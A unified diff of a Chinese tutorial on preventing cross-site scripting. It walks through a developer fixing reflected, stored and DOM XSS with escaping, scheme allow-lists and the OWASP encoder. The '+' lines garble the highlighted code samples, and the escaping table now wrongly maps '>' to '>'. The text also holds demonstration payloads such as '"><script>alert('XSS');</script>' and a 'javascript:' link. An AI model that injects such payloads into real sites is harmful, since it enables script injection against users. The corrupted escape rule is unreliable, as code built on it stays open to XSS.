@@ -33,11 +33,11 @@ XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，[我
 
 某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&lt;%= getParameter("&lt;/span>&lt;span class="hljs-attr">keyword&lt;/span>") %&gt;&lt;/span>"&gt;
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
-  您搜索的关键词是：&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">getParameter&lt;/span>("&lt;span class="hljs-attr">keyword&lt;/span>") %&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&lt;%= getParameter("&lt;/span>&lt;span class="hljs-attr">keyword&lt;/span>") %>&lt;/span>">
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>>&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
+  您搜索的关键词是：&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">getParameter&lt;/span>("&lt;span class="hljs-attr">keyword&lt;/span>") %>&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
 </code></pre>
 
 然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：
@@ -52,11 +52,11 @@ XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，[我
 
 当[浏览器](https://www.w3cdoc.com)请求 `http://xxx/search?keyword="><script>alert('XSS');</script>` 时，服务端会解析出请求参数 `keyword`，得到 `"><script>alert('XSS');</script>`，拼接到 HTML 中返回给[浏览器](https://www.w3cdoc.com)。形成了如下的 HTML：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">""&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">alert(&lt;span class="hljs-string">'XSS'&lt;/span>);&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>"&gt;
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
-  您搜索的关键词是："&gt;&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">alert(&lt;span class="hljs-string">'XSS'&lt;/span>);&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">""&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">alert(&lt;span class="hljs-string">'XSS'&lt;/span>);&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>">
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>>&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
+  您搜索的关键词是：">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">alert(&lt;span class="hljs-string">'XSS'&lt;/span>);&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
 </code></pre>
 
 [浏览器](https://www.w3cdoc.com)无法分辨出 `<script>alert('XSS');</script>` 是恶意代码，因而将其执行。
@@ -69,24 +69,24 @@ XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，[我
 
 聪明的小明很快找到解决方法，把这个漏洞修复：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>&lt;span class="hljs-attr">keyword&lt;/span>")) %&gt;&lt;/span>"&gt;
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
-  您搜索的关键词是：&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">escapeHTML&lt;/span>(&lt;span class="hljs-attr">getParameter&lt;/span>("&lt;span class="hljs-attr">keyword&lt;/span>")) %&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>&lt;span class="hljs-attr">keyword&lt;/span>")) %>&lt;/span>">
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>>&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
+  您搜索的关键词是：&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">escapeHTML&lt;/span>(&lt;span class="hljs-attr">getParameter&lt;/span>("&lt;span class="hljs-attr">keyword&lt;/span>")) %>&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
 </code></pre>
 
 `escapeHTML()` 按照如下规则进行转义：
 
-|字符|转义后的字符| |-|-| |`&`|`&amp;`| |`<`|`&lt;`| |`>`|`&gt;`| |`"`|`&quot;`| |`'`|`&#x27;`| |`/`|`&#x2F;`|
+|字符|转义后的字符| |-|-| |`&`|`&amp;`| |`<`|`&lt;`| |`>`|`>`| |`"`|`&quot;`| |`'`|`&#x27;`| |`/`|`&#x2F;`|
 
 经过了转义函数的处理后，最终[浏览器](https://www.w3cdoc.com)接收到的响应为：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;&#x2F;script&gt;"&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
-  您搜索的关键词是：&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;&#x2F;script&gt;
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">type&lt;/span>=&lt;span class="hljs-string">"text"&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&quot;>&lt;script>alert(&#x27;XSS&#x27;);&lt;&#x2F;script>"&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>>&lt;/span>搜索&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>>&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
+  您搜索的关键词是：&quot;>&lt;script>alert(&#x27;XSS&#x27;);&lt;&#x2F;script>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
 </code></pre>
 
 恶意代码都被转义，不再被[浏览器](https://www.w3cdoc.com)执行，而且搜索词能够完美的在页面显示出来。
@@ -108,12 +108,12 @@ XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，[我
 
 小明打开对应页面的源码，发现有以下内容：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>&lt;span class="hljs-attr">redirect_to&lt;/span>")) %&gt;&lt;/span>"&gt;跳转...&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>&lt;span class="hljs-attr">redirect_to&lt;/span>")) %>&lt;/span>">跳转...&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>
 </code></pre>
 
 这段代码，当攻击 URL 为 `http://xxx/?redirect_to=javascript:alert('XSS')`，服务端响应就成了：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"javascript:alert(&#x27;XSS&#x27;)"&lt;/span>&gt;&lt;/span>跳转...&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"javascript:alert(&#x27;XSS&#x27;)"&lt;/span>>&lt;/span>跳转...&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>
 </code></pre>
 
 虽然代码不会立即执行，但一旦用户点击 `a` 标签时，[浏览器](https://www.w3cdoc.com)会就会弹出“XSS”。
@@ -131,13 +131,13 @@ XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，[我
 <pre><code class="language-java hljs">&lt;span class="hljs-comment">// 禁止 URL 以 "javascript:" 开头&lt;/span>
 xss = getParameter(&lt;span class="hljs-string">"redirect_to"&lt;/span>).startsWith(&lt;span class="hljs-string">'javascript:'&lt;/span>);
 &lt;span class="hljs-keyword">if&lt;/span> (!xss) {
-  &lt;a href=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>redirect_to&lt;span class="hljs-string">"))%&gt;"&lt;/span>&gt;
+  &lt;a href=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>redirect_to&lt;span class="hljs-string">"))%>"&lt;/span>>
     跳转...
-  &lt;/a&gt;
+  &lt;/a>
 } &lt;span class="hljs-keyword">else&lt;/span> {
-  &lt;a href=&lt;span class="hljs-string">"/404"&lt;/span>&gt;
+  &lt;a href=&lt;span class="hljs-string">"/404"&lt;/span>>
     跳转...
-  &lt;/a&gt;
+  &lt;/a>
 }
 </code></pre>
 
@@ -165,13 +165,13 @@ allowSchemes = [&lt;span class="hljs-string">"http"&lt;/span>, &lt;span class="h
 valid = isValid(getParameter(&lt;span class="hljs-string">"redirect_to"&lt;/span>), allowSchemes);
 
 &lt;span class="hljs-keyword">if&lt;/span> (valid) {
-  &lt;a href=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>redirect_to&lt;span class="hljs-string">"))%&gt;"&lt;/span>&gt;
+  &lt;a href=&lt;span class="hljs-string">"&lt;%= escapeHTML(getParameter("&lt;/span>redirect_to&lt;span class="hljs-string">"))%>"&lt;/span>>
     跳转...
-  &lt;/a&gt;
+  &lt;/a>
 } &lt;span class="hljs-keyword">else&lt;/span> {
-  &lt;a href=&lt;span class="hljs-string">"/404"&lt;/span>&gt;
+  &lt;a href=&lt;span class="hljs-string">"/404"&lt;/span>>
     跳转...
-  &lt;/a&gt;
+  &lt;/a>
 }
 </code></pre>
 
@@ -184,9 +184,9 @@ valid = isValid(getParameter(&lt;span class="hljs-string">"redirect_to"&lt;/span
 
 某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">
-&lt;span class="hljs-keyword">var&lt;/span> initData = &lt;span class="xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">data.toJSON&lt;/span>() %&gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">
+&lt;span class="hljs-keyword">var&lt;/span> initData = &lt;span class="xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">data.toJSON&lt;/span>() %>&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>
 </code></pre>
 
 插入 JSON 的地方不能使用 `escapeHTML()`，因为转义 `"` 后，JSON 格式会被破坏。
@@ -204,8 +204,8 @@ valid = isValid(getParameter(&lt;span class="hljs-string">"redirect_to"&lt;/span
 
 **修复后的代码如下：**
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">
-&lt;span class="hljs-keyword">var&lt;/span> initData = &lt;span class="xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">escapeEmbedJSON&lt;/span>(&lt;span class="hljs-attr">data.toJSON&lt;/span>()) %&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">
+&lt;span class="hljs-keyword">var&lt;/span> initData = &lt;span class="xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">escapeEmbedJSON&lt;/span>(&lt;span class="hljs-attr">data.toJSON&lt;/span>()) %>&lt;/span>
 &lt;/span>&lt;/span></code></pre>
 
 **通过这个事件，小明学习到了如下知识：**
@@ -329,7 +329,7 @@ DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行
   2. 在[前端](https://www.w3cdoc.com)中，不同的位置所需的编码也不同。
       * 当 `5 &lt; 7` 作为 HTML 拼接页面时，可以正常显示：
 
-    <pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span> &lt;span class="hljs-attr">title&lt;/span>=&lt;span class="hljs-string">"comment"&lt;/span>&gt;&lt;/span>5 &lt; 7&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
+    <pre><code class="language-html hljs xml">&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span> &lt;span class="hljs-attr">title&lt;/span>=&lt;span class="hljs-string">"comment"&lt;/span>>&lt;/span>5 &lt; 7&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
 </code></pre>
 
       * 当 `5 &lt; 7` 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，[前端](https://www.w3cdoc.com)得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。
@@ -378,52 +378,52 @@ DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行
 
 例如 Java 工程里，常用的转义库为 `org.owasp.encoder`。以下代码引用自 [org.owasp.encoder 的官方说明<i class="fa fa-link" aria-hidden="true"></i>][1]。
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-comment">&lt;!-- HTML 标签内文字内容 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">Encode.forHtml&lt;/span>(&lt;span class="hljs-attr">UNTRUSTED&lt;/span>) %&gt;&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-comment">&lt;!-- HTML 标签内文字内容 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span>>&lt;/span>&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">%=&lt;/span> &lt;span class="hljs-attr">Encode.forHtml&lt;/span>(&lt;span class="hljs-attr">UNTRUSTED&lt;/span>) %>&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">div&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- HTML 标签属性值 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&lt;%= Encode.forHtml(UNTRUSTED) %&gt;"&lt;/span> /&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- HTML 标签属性值 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">input&lt;/span> &lt;span class="hljs-attr">value&lt;/span>=&lt;span class="hljs-string">"&lt;%= Encode.forHtml(UNTRUSTED) %>"&lt;/span> />&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- CSS 属性值 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span> &lt;span class="hljs-attr">style&lt;/span>=&lt;span class="hljs-string">"width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- CSS 属性值 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span> &lt;span class="hljs-attr">style&lt;/span>=&lt;span class="hljs-string">"width:&lt;= Encode.forCssString(UNTRUSTED) %>"&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- CSS URL --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span> &lt;span class="hljs-attr">style&lt;/span>=&lt;span class="hljs-string">"background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- CSS URL -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">div&lt;/span> &lt;span class="hljs-attr">style&lt;/span>=&lt;span class="hljs-string">"background:&lt;= Encode.forCssUrl(UNTRUSTED) %>"&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- JavaScript 内联代码块 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">
-  &lt;span class="hljs-keyword">var&lt;/span> msg = &lt;span class="hljs-string">"&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;"&lt;/span>;
+&lt;span class="hljs-comment">&lt;!-- JavaScript 内联代码块 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">
+  &lt;span class="hljs-keyword">var&lt;/span> msg = &lt;span class="hljs-string">"&lt;%= Encode.forJavaScript(UNTRUSTED) %>"&lt;/span>;
   alert(msg);
-&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>
+&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">
-&lt;span class="hljs-keyword">var&lt;/span> __INITIAL_STATE__ = &lt;span class="hljs-built_in">JSON&lt;/span>.parse(&lt;span class="hljs-string">'&lt;%= Encoder.forJavaScript(data.to_json) %&gt;'&lt;/span>);
-&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- JavaScript 内联代码块内嵌 JSON -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">
+&lt;span class="hljs-keyword">var&lt;/span> __INITIAL_STATE__ = &lt;span class="hljs-built_in">JSON&lt;/span>.parse(&lt;span class="hljs-string">'&lt;%= Encoder.forJavaScript(data.to_json) %>'&lt;/span>);
+&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- HTML 标签内联监听器 --&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- HTML 标签内联监听器 -->&lt;/span>
 &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">button&lt;/span>
-  &lt;span class="hljs-attr">onclick&lt;/span>=&lt;span class="hljs-string">"alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"&lt;/span>&gt;&lt;/span>
+  &lt;span class="hljs-attr">onclick&lt;/span>=&lt;span class="hljs-string">"alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %>');"&lt;/span>>&lt;/span>
   click me
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">button&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- URL 参数 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&order=1#top"&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- URL 参数 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top"&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-comment">&lt;!-- URL 路径 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- URL 路径 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %>"&lt;/span>>&lt;/span>
 
 &lt;span class="hljs-comment">&lt;!--
   URL.
   注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等
---&gt;&lt;/span>
+-->&lt;/span>
 &lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">'&lt;%=
   urlValidator.isValid(UNTRUSTED) ?
     Encode.forHtml(UNTRUSTED) :
     "/404"
-%&gt;'&lt;/span>&gt;&lt;/span>
+%>'&lt;/span>>&lt;/span>
   link
-&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>
 </code></pre>
 
 可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。
@@ -438,13 +438,13 @@ DOM 型 XSS 攻击，实际上就是网站[前端](https://www.w3cdoc.com) JavaS
 
 DOM 中的内联事件监听器，如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等，`<a>` 标签的 `href` 属性，JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。
 
-<pre><code class="language-html hljs xml">&lt;span class="hljs-comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;&lt;/span>
+<pre><code class="language-html hljs xml">&lt;span class="hljs-comment">&lt;!-- 内联事件监听器中包含恶意代码 -->&lt;/span>
 ![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)
 
-&lt;span class="hljs-comment">&lt;!-- 链接内包含恶意代码 --&gt;&lt;/span>
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"UNTRUSTED"&lt;/span>&gt;&lt;/span>1&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>&gt;&lt;/span>
+&lt;span class="hljs-comment">&lt;!-- 链接内包含恶意代码 -->&lt;/span>
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">a&lt;/span> &lt;span class="hljs-attr">href&lt;/span>=&lt;span class="hljs-string">"UNTRUSTED"&lt;/span>>&lt;/span>1&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">a&lt;/span>>&lt;/span>
 
-&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>&lt;span class="javascript">
+&lt;span class="hljs-tag">&lt;&lt;span class="hljs-name">script&lt;/span>>&lt;/span>&lt;span class="javascript">
 &lt;span class="hljs-comment">// setTimeout()/setInterval() 中调用恶意代码&lt;/span>
 setTimeout(&lt;span class="hljs-string">"UNTRUSTED"&lt;/span>)
 setInterval(&lt;span class="hljs-string">"UNTRUSTED"&lt;/span>)
@@ -454,7 +454,7 @@ location.href = &lt;span class="hljs-string">'UNTRUSTED'&lt;/span>
 
 &lt;span class="hljs-comment">// eval() 中调用恶意代码&lt;/span>
 &lt;span class="hljs-built_in">eval&lt;/span>(&lt;span class="hljs-string">"UNTRUSTED"&lt;/span>)
-&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>&gt;&lt;/span>
+&lt;/span>&lt;span class="hljs-tag">&lt;/&lt;span class="hljs-name">script&lt;/span>>&lt;/span>
 </code></pre>
 
 如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。
@@ -495,7 +495,7 @@ location.href = &lt;span class="hljs-string">'UNTRUSTED'&lt;/span>
 
 在[Unleashing an Ultimate XSS Polyglot<i class="fa fa-link" aria-hidden="true"></i>][2]一文中，小明发现了这么一个字符串：
 
